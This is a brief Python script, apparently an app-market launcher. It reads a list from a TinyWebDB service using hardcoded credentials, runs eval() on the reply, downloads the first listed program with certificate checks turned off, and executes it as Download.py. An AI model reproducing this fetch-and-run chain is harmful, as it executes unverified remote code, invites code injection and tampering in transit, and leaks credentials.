import requests,os,warnings

def webdbget(user,password,tag):#获取数据库
    postdata = {'user':user,'secret':password,'action':'get','tag':tag}
    r = requests.post('http://tinywebdb.appinventor.space/api',data=postdata)
    temp = r.text
    temp1 = eval(temp)[tag]
    return temp1
def urldownload(url,filename):
    warnings.filterwarnings('ignore')
    down_res = requests.get(url=url,verify=False)
    if not os.path.exists(filename):
        file = open(filename,'a')
        file.close()
    with open(filename,'wb') as file:
        file.write(down_res.content)
programlist = webdbget('zhmarket','9d6ef697','marketapps')
urldownload(programlist[0]['downloadurl'],'Download.py')
os.system("start python Download.py")
quit()
